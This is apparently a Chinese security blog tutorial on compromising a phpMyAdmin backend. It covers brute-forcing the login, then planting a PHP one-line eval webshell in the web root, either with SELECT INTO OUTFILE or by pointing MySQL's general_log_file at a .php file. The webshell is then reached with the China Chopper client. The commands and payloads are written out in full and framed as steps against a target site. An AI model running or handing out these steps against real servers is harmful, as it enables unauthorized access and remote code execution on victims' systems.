**目录**

[phpmyadmin](#t0 "phpmyadmin")

[phpmyadmin后台的爆破](#t1 "phpmyadmin后台的爆破")

[phpmyadmin后台GetShell](#t2 "phpmyadmin后台GetShell")

[into outfile写木马](#t3 "into outfile写木马")

[利用日志文件Getshell](#t4 "利用日志文件Getshell")

* * *

phpmyadmin
==========

[phpMyAdmin](https://so.csdn.net/so/search?q=phpMyAdmin&spm=1001.2101.3001.7020) 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。

phpmyadmin后台的爆破
---------------

当我们发现目标网站的phpmyadmin后台后，首先想到的肯定就是能不能爆破登录处进入后台。一旦进入了后台，意味着就控制了整个数据库了。

![](https://img-blog.csdnimg.cn/20191209173331613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们这里直接使用phpmyadmin暴力破解工具，然后指定用户名和密码字典即可。

![](https://img-blog.csdnimg.cn/20191209173712520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

phpmyadmin后台GetShell
--------------------

当我们进入了 phpmyadmin 后台后，如何能够获取服务器的权限呢？

以下方法的前提都是需要知道网站的绝对路径。

### into outfile写木马

首先，我们得查看当前是否有写文件的权限，我们需要查看变量 secure\_file\_priv 的值，只有当secure\_file\_priv没有具体值，我们才可以写文件。如果secure\_file\_priv变量有具体的值或者为NULL时，我们则写入不了文件。执行命令：

```
show global variables like 'secure%';
```


如下， secure\_file\_priv的值为空，说明可以写入文件。

![](https://img-blog.csdnimg.cn/20191209175639534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

但是，我们现在需要知道网站的绝对路径，才能执行以下命令将[木马](https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020)写入到网站目录下。

```
select '<?php @eval_r($_POST[cmd])?>' INTO OUTFILE '网站绝对路径/hack.php'
```


可以尝试使用 select @@basedir 来查看MySQL数据库的路径。

![](https://img-blog.csdnimg.cn/20191209180015130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后尝试执行以下命令

```
select '<?php @eval_r($_POST[cmd])?>' INTO OUTFILE 'C:\phpstudy\phptutorial\www\hack.php'
```


![](https://img-blog.csdnimg.cn/20191209180413860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后用菜刀连接即可

### 利用日志文件Getshell

MySQL 5.0版本以上会创建日志文件，我们通过修改日志的全局变量，也可以Getshell。先来看MySQL的两个全局变量：general\_log 和 general\_log file。

*   general log 指的是日志保存状态，ON代表开启 OFF代表关闭；  
     
*   general log file 指的是日志的保存路径。

使用以下命令查看这两个变量的值

```
show variables like '%general%'
```


![](https://img-blog.csdnimg.cn/20191209181126112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

可以看到，general\_log的值是OFF的，我们现在执行命令将它打开

```
set global general_log='on'
```


![](https://img-blog.csdnimg.cn/20191209181253732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

当general\_log的值为ON时，所执行的sql语句都会出现在 `WIN7.log` 文件**。**

`现在我们设置`general\_log\_file的值，将其设置为网站根目录下。那么我们执行的SQL语句就会在该文件中。

```
set global general_log_file="C:/phpStudy/PHPTutorial/WWW/hack.php"
```


![](https://img-blog.csdnimg.cn/20191209181630591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

现在我们执行一句话木马的SQL语句，这一句话木马会在日志文件中

```
SELECT '<?php eval($_POST["cmd"]);?>'
```


![](https://img-blog.csdnimg.cn/20191209181825634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20191209182251602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后用菜刀连接即可。

注：以上设置 general\_log 和 general\_log\_file 只对当前环境窗口有效，也就是以上几条命令须在同一窗口执行。

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)